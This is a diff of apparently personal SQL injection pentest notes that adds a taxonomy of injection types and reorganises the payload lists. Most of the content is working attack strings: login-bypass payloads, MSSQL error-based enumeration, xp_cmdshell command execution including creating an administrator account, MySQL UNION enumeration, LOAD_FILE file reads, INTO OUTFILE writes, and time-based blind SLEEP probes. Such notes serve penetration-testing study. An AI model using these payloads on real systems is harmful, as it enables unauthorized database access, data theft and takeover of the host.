@@ -7,10 +7,27 @@ SQLI impact
     MySql: read sensitive files, write arbitrary files (backdoor).
     MsSql: Code execution
 
-Testing SQLI
-    Test error based sending ' " ; and look for errors.
-    Test for boolean based sending ' or '1'='1 and look for differences.
-    Other payloads:
+Taxonomy
+
+    Inband error based
+        The syntax error is shown in the response and it can be used to get results, may be enough to enumerate the db.
+
+    Inband union based:
+        Union operator to combine the results with another query and enumerate
+
+    Blind Boolean based
+        You can not trigger any database output in the response, but cause differences in the app behaviour (true/false).
+
+    Blind time based
+        Same as Boolean based, but causing a time delay rather than significant response differences.
+
+    Outband
+        The query is executed in another thread/process and no side effects in the inband response can be produce. Test it with a ping back.
+
+Identifying SQLI
+    Test error based sending **' " ;** and look for errors.
+    Test for boolean based sending **' or '1'='1** or ** or 1=1** and look for differences.
+    Other boolean payloads:
     *2' or '1'='1
 ' or 1=1 --
 a' or 1=1 --
@@ -24,56 +41,56 @@ or 1=1 --
 ') or ('x'='x
 ") or ("x"="x
 ' or username LIKE '%admin%*
-    Payloads, log in as admin
+    Payloads, where username is 'admin':
     *' or ( 1=1 and username='admin');
 admin' --*
 
-MsSql attacks
-    Group by and *having* can be used to specify a search condition for a group and aggregate the result.
-        1. Sending ' having 1=1-- should produce column 'table.column1' is invalid...
-        2. Sending ' group by table.column1 having 1=1--- should produce: column 'table.column2' is invalid...
-        3. Sending ' group by table.column1,table.column2 HAVING 1=1-- should end up generating no error when you put all the columns.
+MsSql Exploitation
+    Group by and **having** can be used to specify a search condition for a group and aggregate the result.
+        Sending **' having 1=1--** should produce **column 'table.column1' is invalid**
+        2. Sending **' group by table.column1 having 1=1--** should produce **column 'table.column2' is invalid**
+        3. Sending **' group by table.column1,table.column2 having 1=1--** should end up generating no error when you specify all the columns.
 
     You can generate error and get debug info:
-        Sending convert(int, @@version)-- should produce: failed when convering SQL Server ...
+        Sending **convert(int, @@version)--** should trigger the error **failed when convering SQL Server...***
     Other payloads:
-        convert(int,user_name())--
-        convert(int, @@db_name())--
+        *convert(int,user_name())--
+convert(int, @@db_name())--*
 
-        If the DB runs as sa, you can run XP_CMDSHELL to get code execution.
+        If the DB runs as sa, you can run **XP_CMDSHELL** to get code execution.
 
     Useful queries:
-        SELECT Distinct TABLE_NAME FROM information_schema.TABLES
-        exec master.dbo.xp_cmdshell 'CMD'
+        **SELECT Distinct TABLE_NAME FROM information_schema.TABLES*
+exec master.dbo.xp_cmdshell 'CMD'**
 
-Blind MsSqlI
+    MsSqlI blind exploitation
     For numeric contexts (look for differences):
-        and 1=1
-        and 1=2
+        *and 1=1
+and 1=2*
 
     Once we found the injection, we can leak data from the DB by guessing one character at a time as follows:
-        AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109
-    if it is true, we know the db_name starts with 109 (m).
+        **AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109**
+    if it is true, we know the db_name starts with 109(m).
 
 
-Find number of columns using ORDER BY
+Finding number of columns using ORDER BY
     We can use order by to sort the result by a given column number, if the column does not exist, we will get an error:
     *vuln.php?id=1 order by 9 # This throws no error
 vuln.php?id=1 order by 10 # This throws error*
 
-MySql injection, UNION operator
+MySql UNION based injection
     Joins the result of two queries
         Two queries should return the same # of columns.
         Data-types in columns of the select must be of the same orcompatible type.
     Once you have the right number of columns (i.e. 3) you can find the mysql version:
-        UNION SELECT @@version,NULL, NULL#'
+    *UNION SELECT @@version,NULL, NULL#'*
     mysql users:
-        UNION SELECT table_schema,NULL,NULL FROM information_schema.columns#'
-    if the result displays garbage from the first query, you can add a false condition to only show the union result AND 1=0 UNION...
+    *UNION SELECT table_schema,NULL,NULL FROM information_schema.columns#'*
+    if the result displays garbage from the first query, you can add a false condition to only show the union result **AND 1=0 UNION...**
     Read files
-        AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'
+    *AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'*
     Write files
-        AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
+    *AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'*
     Other payloads:
     *-1 union all select @@version --
 1 union SELECT user FROM mysql.user
@@ -134,6 +151,11 @@ SELECT distinct(db) FROM mysql.db*
     *SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
     List tables
     *SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
+    Asking if the first character of the user is 'a':
+    *and if(substring (user(),1,1)=’a’,SLEEP(5),1)--”*
+
+    Checking if the admin table exists:
+    *and IF(SUBSTRING ((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)*
 
 MySql in-band, union based SQLI exploitation
     Enumerate user
@@ -204,7 +226,7 @@ RECONFIGURE;*
     Add user
     *';exec master..xp_cmdshell 'net user pwned 1234 /ADD && net localgroup administrators pwned /ADD'; --*
 
-If it did not work, try enumerating the database. Find col until no error tells you the columns:
+    If it did not work, try enumerating the database. Find col until no error tells you the columns:
     *1002' ORDER BY 1--
 1002' ORDER BY 2--
 1002' ORDER BY 3--*
